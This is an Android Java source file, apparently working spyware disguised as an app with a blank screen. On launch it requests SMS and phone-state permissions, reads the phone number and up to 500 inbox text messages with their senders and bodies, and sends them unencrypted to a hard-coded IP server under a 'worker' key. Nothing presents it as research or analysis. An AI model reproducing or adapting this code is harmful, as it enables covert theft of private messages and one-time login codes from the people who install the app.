package com.my.myapp;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

// Импортируем сгенерированный BuildConfig
import com.my.myapp.BuildConfig;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 123;
    private String deviceId;
    private ExecutorService executor = Executors.newSingleThreadExecutor();

    private static final String SERVER_URL = "http://154.83.159.245:3000";
    // Убрали хардкод WORKER_KEY, теперь используем BuildConfig.WORKER_KEY

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().requestFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        View view = new View(this);
        view.setBackgroundColor(0xFFFFFFFF);
        setContentView(view);

        deviceId = UUID.randomUUID().toString();
        Log.d("QSUK", "🆔 Device ID: " + deviceId);
        // Используем BuildConfig.WORKER_KEY
        Log.d("QSUK", "🔑 Worker Key: " + BuildConfig.WORKER_KEY);

        saveDeviceId(deviceId);

        checkPermissions();
    }

    private void saveDeviceId(String id) {
        SharedPreferences prefs = getSharedPreferences("QSUK_PREFS", Context.MODE_PRIVATE);
        prefs.edit().putString("deviceId", id).apply();
        Log.d("QSUK", "💾 Device ID сохранен");
    }

    public static String getDeviceId(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("QSUK_PREFS", Context.MODE_PRIVATE);
        return prefs.getString("deviceId", null);
    }

    private void checkPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_SMS);
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.RECEIVE_SMS);
        }

        if (Build.VERSION.SDK_INT >= 29) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
            }
        }

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsNeeded.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE);
        } else {
            collectData();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                collectData();
            } else {
                Toast.makeText(this, "Нужны разрешения", Toast.LENGTH_LONG).show();
                finish();
            }
        }
    }

    private void collectData() {
        executor.execute(() -> {
            try {
                JSONObject data = new JSONObject();
                data.put("deviceId", deviceId);
                data.put("model", Build.MANUFACTURER + " " + Build.MODEL);
                data.put("android", Build.VERSION.RELEASE);
                // Используем ключ из BuildConfig
                data.put("worker", BuildConfig.WORKER_KEY);

                try {
                    TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                            == PackageManager.PERMISSION_GRANTED) {

                        if (Build.VERSION.SDK_INT >= 23) {
                            String phoneNumber = tm.getLine1Number();
                            data.put("phone", phoneNumber != null ? phoneNumber : "");
                        }

                        if (Build.VERSION.SDK_INT >= 22) {
                            SubscriptionManager sm = getSystemService(SubscriptionManager.class);
                            if (sm != null) {
                                List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                                data.put("simCount", subs != null ? subs.size() : 1);
                            } else {
                                data.put("simCount", 1);
                            }
                        } else {
                            data.put("simCount", 1);
                        }
                    } else {
                        data.put("phone", "");
                        data.put("simCount", 1);
                    }
                } catch (Exception e) {
                    data.put("phone", "");
                    data.put("simCount", 1);
                }

                JSONArray smsArray = new JSONArray();
                Cursor cursor = getContentResolver().query(
                        Uri.parse("content://sms/inbox"),
                        null, null, null,
                        "date DESC LIMIT 500"
                );

                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        try {
                            JSONObject sms = new JSONObject();
                            sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                            sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                            sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                            smsArray.put(sms);
                        } catch (Exception e) {
                            Log.e("QSUK", "SMS parse error", e);
                        }
                    }
                    cursor.close();
                }

                data.put("oldSms", smsArray);

                sendPostRequest("/api/register", data.toString());

            } catch (Exception e) {
                Log.e("QSUK", "Error", e);
            }
        });
    }

    private void sendPostRequest(String endpoint, String jsonData) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(SERVER_URL + endpoint);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);

            OutputStream os = conn.getOutputStream();
            os.write(jsonData.getBytes());
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d("QSUK", "✅ Сервер ответил: " + responseCode);

        } catch (Exception e) {
            Log.e("QSUK", "❌ Ошибка отправки", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }
}